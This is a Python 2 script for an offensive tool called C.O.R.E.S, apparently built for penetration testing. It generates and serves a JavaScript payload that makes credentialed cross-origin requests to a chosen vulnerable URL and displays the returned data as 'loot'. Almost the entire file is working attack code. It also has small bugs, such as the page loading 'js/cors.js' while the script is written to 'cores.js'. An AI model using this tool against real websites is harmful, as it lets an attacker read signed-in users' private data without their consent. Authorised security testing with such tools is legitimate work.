#!/usr/bin/env python2
"""
C.O.R.E.S
Cross-Origin Resource Exploitation Server
"""

import argparse
import json
import os
import signal
import socket
import urllib

# Simple HTTP Server
import SocketServer, SimpleHTTPServer, multiprocessing
# Browser Launch
import webbrowser
# Custom theme
from theme import *

class Cores(object):
    """cores object"""

    def __init__(self, method, port, autolaunch_browser, url, access_control, log_style, \
        Version, Contributors, verbose):
        """inits values"""

        self.url = url
        self.access_control = access_control
        self.log_style = log_style
        self.method = method
        self.port = port
        self.Version = Version
        self.Contributors = Contributors
        self.verbose = verbose
        self.internal_ip = None
        self.external_ip = None
        self.html_name = 'cores.html'
        self.http_server_pid = None
        self.autolaunch_browser = autolaunch_browser

    def dir_check(self):
        ''' If specified directory does not exist then create specified directory '''
        if not os.path.exists('./js'):
            os.makedirs('./js')

    def get_external_address(self):
        ''' Obtains External IP Address '''
        try:
            self.external_ip = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
            return self.external_ip["ip"]
        except IOError:
            print(red('!')+ 'Check your Internet connection')

    def get_internal_address(self):
        """use socket to try to connect to 8.8.8.8 on tcp/53, return getsockname as internal_ip"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect(("8.8.8.8", 53))
            self.internal_ip = sock.getsockname()[0]
            return self.internal_ip
        except socket.error, msg:
            print(msg)

    def browser_launch(self):
        ''' Auto Launches Firefox '''
        try:
            url = "http://localhost:{}/index.html".format(self.port)
            browser_path = "/usr/bin/firefox"
            webbrowser.get(str(browser_path)).open(url)
        except webbrowser.Error, e:
            print("Firefox not found!{}".format(e))

    def cors_js_template(self):
        ''' 1. Create CORS template for JavaScript Payload
            2. Write CORS template to file '''

        if self.log_style.lower() == 'html':
            filename = './js/cores.js'
            cors_js_template = """var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('{0}','{1}',true);
req.withCredentials = {2};
req.send();
function reqListener() {{
    document.getElementById("loot").innerHTML = (this.responseText);
}};"""

        if self.log_style.lower() == 'alert':
            filename = './js/cores.js'
            cors_js_template = """var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('{0}','{1}',true);
req.withCredentials = {2};
req.send();
function reqListener() {{
window.alert(this.responseText);
}};"""

        cors_js = cors_js_template.format(self.method, self.url, self.access_control)

        if self.verbose is True:
            print('{}\n'.format(str(cors_js)))

        with open(filename, 'w+') as f:
            f.write(cors_js)
            return cors_js

    def html_template(self):
        ''' 1. Create HTML template for index.html
            2. Write index.html to file '''
        filename = './index.html'
        html_template = """
        <!DOCTYPE HTML>
        <html lang="en-US">
        <title>C.O.R.E.S</title>
        <head></head>
            <body>
                <p style="margin-left: 55px">
                <b>Cross-Origin Resource Exploitation Server</b><br>
                CORES {0}<br>
                Description:Cross-Origin Resource Exploitation Server.<br>
                Created by: Nick Sanzotta/@Beamr<br></p>
                
                <p style="margin-left: 55px">
                <b>Logs:</b></p>
                <p style="margin-left: 55px", id="loot"></p>
                    <script src="js/cors.js"></script>
            </body>
        </html>"""
        html_index_page = html_template.format(self.Version, self.Contributors)
        with open(filename, 'w+') as f:
            f.write(html_index_page)
        return html_index_page

    def server_kill(self):
        """tries to gracefully kill the webserver"""
        try:
            # print('Trying to stop server process %s' % str(serverPid))
            os.kill(int(self.http_server_pid), 9)
        except Exception as e:
            print(e)

    def server_start(self):
        '''Starts Python's SimpleHTTPServer on a specified port'''
        #maybe just use subprocess.Popen to run simple server?

        print('Starting local http server on tcp/{}'.format(str(self.port)))
        addr = ("0.0.0.0", self.port)
        #starts simplehttpserver as http_handler
        http_handler = SimpleHTTPServer.SimpleHTTPRequestHandler

        #starts httpd as socked server
        httpd = SocketServer.TCPServer((addr), http_handler, bind_and_activate=False)
        httpd.allow_reuse_address = True
        server_process = multiprocessing.Process(target=httpd.serve_forever)
        server_process.daemon = False

        #try to bind and activate or exit
        try:
            httpd.server_bind()
            httpd.server_activate()
            print(blue('i')+ 'Target URL:  '+ self.url)
            server_url = 'http://{}:{}/{}'.format(self.internal_ip, self.port, self.html_name)
            print(blue('i')+'HTTP Server: {}\n'.format(server_url))
        except Exception as e:
            httpd.server_close()
            print(e)
        #try to start
        try:
            server_process.start()
        except Exception as e:
            print(e)

        #log the http server PID and print it
        self.http_server_pid = server_process.pid
        print('Server running at PID: {}').format(self.http_server_pid)
        #return the PID and tell the user to ctrl-c to stop the madness
        return self.http_server_pid

def main():
    """main function handles argument processing and sigint handling"""

    # App info
    App = ' CORES '
    Version = 'v1.10092017'
    Author = 'Nick Sanzotta/@Beamr'
    Contributors = 'Bill Harshbarger'

    parser = argparse.ArgumentParser()
    parser.add_argument('-m', '--method', \
        metavar='GET, POST, etc.', \
        help='Define HTTP request method [GET, HEAD, POST] ex: -m POST', \
        required=True)
    parser.add_argument('-p', '--port', \
        metavar='8080',\
        help='Port to start local HTTP server on.', \
        required=True, \
        type=int)
    parser.add_argument('-c', '--access_control', \
        action='store_true', \
        help='Sets Access-Control-Allow-Credentials to true')
    parser.add_argument('-a', '--autolaunch_browser', \
        help='Auto launches a browser', \
        action='store_true')
    parser.add_argument('-s', '--log_style', \
        metavar='alert || html', \
        required=True, help='Select log style: javascript / inner html', \
        choices=['alert', 'html'])
    parser.add_argument('-u', '--url', \
        metavar='http://foo.com', \
        required=True, help='Define vulnerable CORS targert URL ex: https://site.com/')
    parser.add_argument('-v', '--verbose', \
        action='store_true', \
        help='Turn on Verbosity (Displays JavaScript code in STDOUT)')
    args = parser.parse_args()

    clearscreen()
    banner(App, Version, Author, Contributors)

    runcores = Cores(args.method, args.port, args.autolaunch_browser, args.url, \
        args.access_control, args.log_style, Version, Contributors, args.verbose)
    runcores.dir_check()
    runcores.get_external_address()
    runcores.get_internal_address()
    runcores.cors_js_template()
    runcores.html_template()

    #set up a way to gracefully exit
    print('\nHit Ctrl-C to stop serving....\n')

    def sigterm_handler(signal, frame):
        runcores.server_kill()

    def sigint_handler(signal, frame):
        runcores.server_kill()
        print('\nSEEYA!!!')

    # Catch ^C sigint
    signal.signal(signal.SIGINT, sigint_handler)
    signal.signal(signal.SIGTERM, sigterm_handler)

    #start the CORES server
    runcores.server_start()

    if args.autolaunch_browser is True:
        runcores.browser_launch()

if __name__ == '__main__':
    main()
